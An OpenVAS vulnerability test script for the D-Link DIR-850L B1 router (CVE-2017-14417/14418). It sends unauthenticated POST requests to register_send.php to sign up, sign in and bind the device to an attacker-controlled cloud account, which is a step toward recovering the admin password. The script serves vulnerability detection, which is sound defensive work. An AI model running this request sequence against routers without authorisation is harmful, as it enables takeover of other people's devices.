###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink_dir850l_B1_mul_vul_remote.nasl 8586 2018-01-30 14:08:56Z cfischer $
#
# D-Link 850L Firmware B1 Admin Password Disclosure Vulnerability (remote)
#
# Authors:
# Tameem Eissa <tameem.eissa@greenbone.net>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107243");
  script_version("$Revision: 8586 $");
  script_cve_id("CVE-2017-14417", "CVE-2017-14418");
  script_tag(name:"last_modification", value:"$Date: 2018-01-30 15:08:56 +0100 (Tue, 30 Jan 2018) $");
  script_tag(name:"creation_date", value:"2017-09-12 17:47:21 +0200 (Tue, 12 Sep 2017)");

  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("D-Link 850L Firmware B1 Admin Password Disclosure Vulnerability (remote)");

  script_tag(name: "summary", value: "D-Link 850L Firmware B1 is vulnerable to Admin Disclosure Vulnerability.");

  script_tag(name: "vuldetect", value: "Send crafted HTTP POST requests and check the answers.");

  script_tag(name: "insight", value: "The webpage http://ip_of_router/register_send.php doesn't check the authentication of the user, thus an attacker can abuse this webpage to
gain control of the device. This webpage is used to register the device to the myDlink cloud infrastructure. ");
  script_tag(name: "impact" , value: "Remote attacker can retrieve the admin password and gain full access.");
  script_tag(name: "affected", value: "DLink Dir 850 L Rev B1");

  script_tag(name: "solution", value: "No solution or patch is available as of 30th January, 2018. It is recommended to stop using this product immediately.");

  script_xref(name: "URL" , value: "https://packetstormsecurity.com/files/144056/dlink850l-xssexecxsrf.txt");
  script_xref(name: "URL" , value: "http://securityaffairs.co/wordpress/62937/hacking/d-link-dir-850l-zero-day.html");

  script_tag(name:"solution_type", value:"NoneAvailable");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");

  script_family("Web application abuses");

  script_dependencies("gb_dlink_dir_detect.nasl");
  script_mandatory_keys("host_is_dlink_dir", "dlink_hw_version");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!Port = get_kb_item("dlink_dir_port")){
  exit(0);
}

if (!type = get_kb_item("dlink_typ")){
  exit(0);
}

if (!hw_version = get_kb_item("dlink_hw_version")){
  exit(0);
}


if (type == "DIR-850L" && (hw_version == "B1" ))
{

  url = '/register_send.php';

  user_name = rand_str(charset:"abcdefghijklmnopqrstuvwxyz", length:10) + "@" + rand_str(charset:"abcdefghijklmnopqrstuvwxyz", length:5) + ".com";
  password = rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_", length:10);

  firstname = rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_", length:10);
  lastname = rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_", length:10);


  data = 'act=signup&lang=en&outemail=' + user_name + '&passwd=' + password + '&firstname=' + firstname + '&lastname=' + lastname;

  req = http_post_req(port:Port, url:url, data:data, add_headers: make_array("Connection", "Keep-Alive", "Content-Type", "application/x-www-form-urlencoded"));

  res = http_keepalive_send_recv(port: Port, data: req);

  if (res =~ "HTTP/1.. 200 OK" && egrep(pattern:"<result>success</result>", string:res))
  {
     data = 'act=signin&lang=en&outemail=' + user_name + '&passwd=' + password + '&firstname=' + firstname + '&lastname=' + lastname;

     req = http_post_req(port:Port, url:url, data:data, add_headers: make_array("Connection", "Keep-Alive", "Content-Type", "application/x-www-form-urlencoded"));

     res = http_keepalive_send_recv(port: Port, data: req);

     if (res =~ "HTTP/1.. 200 OK" && egrep(pattern:"<result>success</result>", string:res))
     {

        data = 'act=adddev&lang=en';

        req = http_post_req(port:Port, url:url, data:data, add_headers: make_array("Connection", "Keep-Alive", "Content-Type", "application/x-www-form-urlencoded"));

        res = http_keepalive_send_recv(port: Port, data: req);

        if (res =~ "HTTP/1.. 200 OK" && egrep(pattern:"<result>success</result>", string:res))
        {

            report = "It was possible to sign up and sign in with the credentials " + user_name + ":" + password + " and add the device to this account, this can be further used to gain the admin password. It is recommended to stop using this product immediately as there is no solution available yet. ";

            security_message(data:report);
            exit( 0 );

        }

     }

  }

}

exit ( 99 );

